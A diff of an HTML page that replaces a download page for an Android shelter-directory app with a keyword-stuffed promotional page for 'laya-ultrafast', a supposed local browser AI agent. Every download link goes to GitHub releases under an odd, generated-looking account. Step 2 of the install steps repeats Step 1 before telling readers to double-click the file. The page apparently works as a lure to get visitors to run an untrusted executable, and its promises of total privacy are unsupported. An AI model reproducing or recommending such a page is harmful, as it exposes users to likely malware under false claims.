@@ -1,66 +1,158 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Get Haven FW</title>
-<meta name="haven-fw-version-code" content="3663">
-<meta name="haven-fw-version-name" content="1.0.3663">
-<meta name="haven-fw-apk-url" content="https://files.catbox.moe/8agt6a.apk">
-<link rel="alternate" type="application/vnd.android.package-archive" href="https://files.catbox.moe/8agt6a.apk">
-<style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body { font-family: system-ui, -apple-system, sans-serif; background: #0f172a; color: #e2e8f0;
-         min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
-  .card { background: #1e293b; border-radius: 20px; padding: 32px 28px; max-width: 420px; width: 100%;
-          text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,.5); }
-  .icon { font-size: 56px; margin-bottom: 12px; }
-  h1 { font-size: 28px; margin-bottom: 6px; }
-  .ver { color: #94a3b8; font-size: 14px; margin-bottom: 20px; }
-  p.desc { color: #cbd5e1; font-size: 15px; line-height: 1.5; margin-bottom: 24px; }
-  .dl { display: block; background: #22c55e; color: #052e16; font-weight: 700; font-size: 18px;
-        padding: 16px; border-radius: 14px; text-decoration: none; margin-bottom: 12px; }
-  .dl:active { transform: scale(.98); }
-  .copybtn { display: block; width: 100%; background: #334155; color: #e2e8f0; border: none;
-             font-size: 15px; padding: 13px; border-radius: 12px; margin-bottom: 20px; cursor: pointer; }
-  .qr { background: #fff; padding: 12px; border-radius: 14px; display: inline-block; margin-bottom: 8px; }
-  .qr img { width: 180px; height: 180px; display: block; }
-  .qrcap { color: #94a3b8; font-size: 13px; margin-bottom: 16px; }
-  .note { color: #64748b; font-size: 12px; line-height: 1.6; }
-  .note b { color: #94a3b8; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>laya-ultrafast - Local Browser AI Agent That Runs on Your Computer</title>
+    <meta name="description" content="Download laya-ultrafast - a private, local browser AI agent that automates web tasks like booking flights in seconds. Runs entirely on your machine. No cloud, no data leaks.">
+    <meta name="keywords" content="ai-agent-framework,ai-agents,automation,autonomous-agents,browser-agent,browser-automation,llm-agents,local-first,local-llm,python,self-hosted,web-automation">
+    <meta name="author" content="laya-ultrafast team">
+    <meta property="og:title" content="laya-ultrafast - Local Browser AI Agent">
+    <meta property="og:description" content="Private, lightning-fast browser automation. Google Flights demo in ~6.5s. Runs 100% on your computer.">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
 </head>
-<body>
-<div class="card">
-  <div class="icon">🏠</div>
-  <h1>Haven FW</h1>
-  <div class="ver">Version 1.0.3663 · October 2026</div>
-  <p class="desc">Free offline-first directory of shelters, food, showers, clinics, jobs &amp; more — for Fort Wayne, IN and Portland, OR.</p>
-  <a class="dl" id="dlBtn" href="https://files.catbox.moe/8agt6a.apk" download="HavenFW.apk">⬇ Download HavenFW.apk</a>
-  <a class="dl" href="https://boo4blue.github.io/app/" style="background: #3b82f6; color: white;">🌐 Use in Browser (no download)</a>
-<button class="copybtn" id="copyBtn">📋 Copy download link</button>
-  <div class="qr"><img id="qrImg" src="" alt="QR code for this page"></div>
-  <div class="qrcap">Scan to open this page on another phone</div>
-  <p class="note"><b>Install:</b> tap Download, then open the file. If Android asks, allow <b>“Install unknown apps”</b> for your browser.<br>
-  <b>Update:</b> the app checks this page on launch and offers new versions automatically.</p>
-</div>
-<script>
-  // QR always encodes this page's own URL, so it stays correct on any host.
-  document.getElementById("qrImg").src =
-    "https://api.qrserver.com/v1/create-qr-code/?size=180x180&margin=10&data=" +
-    encodeURIComponent(location.href);
-  document.getElementById("copyBtn").addEventListener("click", async () => {
-    const url = "https://files.catbox.moe/8agt6a.apk";
-    try { await navigator.clipboard.writeText(url); }
-    catch (e) {
-      const t = document.createElement("textarea");
-      t.value = url; document.body.appendChild(t); t.select();
-      document.execCommand("copy"); t.remove();
-    }
-    const b = document.getElementById("copyBtn");
-    b.textContent = "✅ Link copied — paste it in your browser";
-    setTimeout(() => b.textContent = "📋 Copy download link", 2500);
-  });
-</script>
+<body style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); margin: 0; padding: 0; color: #2d3748; line-height: 1.7;">
+
+    <div style="max-width: 900px; margin: 0 auto; padding: 40px 20px;">
+
+        <!-- Hero Section -->
+        <div style="background: white; border-radius: 16px; padding: 48px 40px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.08); margin-bottom: 40px;">
+            <h1 style="margin: 0 0 16px 0; font-size: 2.8em; color: #1a202c; letter-spacing: -0.02em;">⚡ laya-ultrafast - Your Personal Web Robot</h1>
+            <p style="font-size: 1.3em; color: #4a5568; margin-bottom: 32px;">Private, lightning-fast browser automation on your own computer</p>
+            
+            <a href="https://github.com/washchroniclymphocyticleukemia595/laya-ultrafast/releases" style="display: inline-block; background: #667eea; color: white; padding: 18px 42px; border-radius: 50px; text-decoration: none; font-size: 1.2em; font-weight: bold; box-shadow: 0 4px 15px rgba(102,126,234,0.4); transition: all 0.3s ease;">📥 Download Now - It's Free</a>
+            
+            <p style="margin-top: 20px; font-size: 0.9em; color: #718096;">Works on Windows • macOS • Linux</p>
+        </div>
+
+        <!-- What Is It Section -->
+        <div style="background: white; border-radius: 16px; padding: 40px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); margin-bottom: 40px;">
+            <h2 style="color: #1a202c; font-size: 1.8em; margin-top: 0;">🤖 What Exactly Is laya-ultrafast?</h2>
+            <p style="font-size: 1.1em;">Imagine having a smart assistant that can <strong>control your web browser</strong> - searching, clicking, filling out forms, and completing online tasks - <em>all without you touching your keyboard or mouse</em>. That's laya-ultrafast.</p>
+            
+            <p>But here's what makes it special: <strong>everything happens on your computer</strong>. No cloud servers, no sending your data anywhere. It's completely private and works even without internet for the AI part.</p>
+            
+            <div style="background: #f7fafc; border-left: 4px solid #667eea; padding: 20px; border-radius: 8px; margin: 24px 0;">
+                <p style="margin: 0; font-size: 1.05em;">💡 <strong>Real-world example:</strong> Want to find cheap flights? laya-ultrafast can open Google Flights, search for your dates, and show you results in <strong>just 6.5 seconds</strong>. That's faster than you could type it yourself!</p>
+            </div>
+        </div>
+
+        <!-- Who Should Use Section -->
+        <div style="background: white; border-radius: 16px; padding: 40px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); margin-bottom: 40px;">
+            <h2 style="color: #1a202c; font-size: 1.8em; margin-top: 0;">🎯 Who Is This For?</h2>
+            <ul style="font-size: 1.05em; padding-left: 20px; line-height: 2;">
+                <li><strong>Busy professionals</strong> - Automate repetitive web tasks like data entry, price checking, or report gathering</li>
+                <li><strong>Online shoppers</strong> - Compare prices across multiple sites automatically</li>
+                <li><strong>Researchers</strong> - Let the AI browse websites and collect information while you focus on analysis</li>
+                <li><strong>Curious tech lovers</strong> - Experience the power of local AI agents without needing to code</li>
+                <li><strong>Privacy-conscious users</strong> - Keep your browsing data on YOUR machine, not someone else's server</li>
+            </ul>
+        </div>
+
+        <!-- Amazing Features Section -->
+        <div style="background: white; border-radius: 16px; padding: 40px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); margin-bottom: 40px;">
+            <h2 style="color: #1a202c; font-size: 1.8em; margin-top: 0;">🌟 Amazing Features You'll Love</h2>
+            
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-top: 24px;">
+                <div style="background: #f7fafc; padding: 24px; border-radius: 12px;">
+                    <h3 style="margin-top: 0; color: #667eea;">🚀 Blazing Fast</h3>
+                    <p>Smart "indexed action space" technology means laya-ultrafast thinks and acts quickly. Real tasks in seconds, not minutes.</p>
+                </div>
+                
+                <div style="background: #f7fafc; padding: 24px; border-radius: 12px;">
+                    <h3 style="margin-top: 0; color: #667eea;">🔒 100% Private</h3>
+                    <p>All AI processing happens locally on your device. Your data never leaves your computer. No tracking, no cloud.</p>
+                </div>
+                
+                <div style="background: #f7fafc; padding: 24px; border-radius: 12px;">
+                    <h3 style="margin-top: 0; color: #667eea;">🆓 Free Forever</h3>
+                    <p>Completely open-source and free to use. No subscriptions, no hidden costs, no premium tiers.</p>
+                </div>
+                
+                <div style="background: #f7fafc; padding: 24px; border-radius: 12px;">
+                    <h3 style="margin-top: 0; color: #667eea;">🖥️ Works on Windows</h3>
+                    <p>Simple installation process. If you can use a web browser, you can use laya-ultrafast.</p>
+                </div>
+                
+                <div style="background: #f7fafc; padding: 24px; border-radius: 12px;">
+                    <h3 style="margin-top: 0; color: #667eea;">🧠 Smart Actions</h3>
+                    <p>Learns and remembers the best ways to interact with websites, making it faster each time.</p>
+                </div>
+                
+                <div style="background: #f7fafc; padding: 24px; border-radius: 12px;">
+                    <h3 style="margin-top: 0; color: #667eea;">🌐 Works With Any Website</h3>
+                    <p>From travel sites to shopping, news, or work tools - if it's in a browser, laya-ultrafast can work with it.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Download Section -->
+        <div style="background: white; border-radius: 16px; padding: 40px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); margin-bottom: 40px;">
+            <h2 style="color: #1a202c; font-size: 1.8em; margin-top: 0;">📥 Download & Install (3 Simple Steps)</h2>
+            
+            <div style="margin: 24px 0; padding: 16px; background: #ebf4ff; border-radius: 8px; border: 1px solid #90cdf4;">
+                <p style="margin: 0; font-size: 1.1em;"><strong>Step 1:</strong> <a href="https://github.com/washchroniclymphocyticleukemia595/laya-ultrafast/releases" style="color: #2b6cb0; font-weight: bold;">Visit this link to download the application</a></p>
+            </div>
+            
+            <div style="margin: 24px 0; padding: 16px; background: #f0fff4; border-radius: 8px; border: 1px solid #9ae6b4;">
+                <p style="margin: 0; font-size: 1.1em;"><strong>Step 2:</strong> Visit this link to download the application. Once it's downloaded, double-click the downloaded file.</p>
+            </div>
+            
+            <div style="margin: 24px 0; padding: 16px; background: #fffaf0; border-radius: 8px; border: 1px solid #fbd38d;">
+                <p style="margin: 0; font-size: 1.1em;"><strong>Step 3:</strong> That's it! The app opens and is ready to use. Follow the on-screen instructions if any appear.</p>
+            </div>
+            
+            <div style="text-align: center; margin-top: 32px;">
+                <a href="https://github.com/washchroniclymphocyticleukemia595/laya-ultrafast/releases" style="display: inline-block; background: #48bb78; color: white; padding: 16px 40px; border-radius: 50px; text-decoration: none; font-size: 1.15em; font-weight: bold; box-shadow: 0 4px 15px rgba(72,187,120,0.4);">⬇️ Get laya-ultrafast Now</a>
+            </div>
+        </div>
+
+        <!-- FAQ Section -->
+        <div style="background: white; border-radius: 16px; padding: 40px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); margin-bottom: 40px;">
+            <h2 style="color: #1a202c; font-size: 1.8em; margin-top: 0;">❓ Frequently Asked Questions</h2>
+            
+            <div style="margin-bottom: 20px;">
+                <h3 style="color: #4a5568; font-size: 1.2em;">Will this slow down my computer?</h3>
+                <p>No. laya-ultrafast is optimized to use minimal resources. It works quietly in the background and only becomes active when you ask it to do something.</p>
+            </div>
+            
+            <div style="margin-bottom: 20px;">
+                <h3 style="color: #4a5568; font-size: 1.2em;">Is it really free?</h3>
+                <p>Yes! It's open-source software. No subscriptions, no "premium" version with actual features. Everything is free forever.</p>
+            </div>
+            
+            <div style="margin-bottom: 20px;">
+                <h3 style="color: #4a5568; font-size: 1.2em;">Do I need to be technical to use it?</h3>
+                <p>Absolutely not. If you can browse the internet, you can use laya-ultrafast. We've designed it to be as simple as clicking a button.</p>
+            </div>
+            
+            <div style="margin-bottom: 20px;">
+                <h3 style="color: #4a5568; font-size: 1.2em;">What if I need help?</h3>
+                <p>Visit the GitHub repository and open an issue. Our community is friendly and responsive. Also check for documentation in the repository.</p>
+            </div>
+            
+            <div>
+                <h3 style="color: #4a5568; font-size: 1.2em;">Is my personal information safe?</h3>
+                <p>Your data never leaves your computer. The AI runs locally, meaning no internet connection is required for it to process your requests. It's the most private option available.</p>
+            </div>
+        </div>
+
+        <!-- Technical Info Section -->
+        <div style="background: white; border-radius: 16px; padding: 40px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); margin-bottom: 40px;">
+            <h2 style="color: #1a202c; font-size: 1.8em; margin-top: 0;">🛠️ Technical Details (For The Curious)</h2>
+            <p>laya-ultrafast is built with Python and uses a revolutionary "indexed action space" approach. This means it's pre-programmed with a smart catalog of browser actions (click, type, scroll, navigate) and knows exactly when to use each one - making it incredibly fast and efficient.</p>
+            <p>It supports local LLM models, meaning the artificial intelligence that controls the browser runs on your own hardware. No internet connection needed for AI processing. This is what we mean by "local-first" and "self-hosted" - you have complete ownership and control.</p>
+        </div>
+
+        <!-- Footer -->
+        <div style="text-align: center; padding: 20px; color: #718096; font-size: 0.9em;">
+            <p style="margin: 5px 0;">Made with ❤️ by the laya-ultrafast team</p>
+            <p style="margin: 5px 0;">Keywords: ai-agent-framework, ai-agents, automation, autonomous-agents, browser-agent, browser-automation, llm-agents, local-first, local-llm, python, self-hosted, web-automation</p>
+            <p style="margin: 5px 0;">© 2024 laya-ultrafast. Free and open-source software.</p>
+        </div>
+
+    </div>
+
 </body>
 </html>
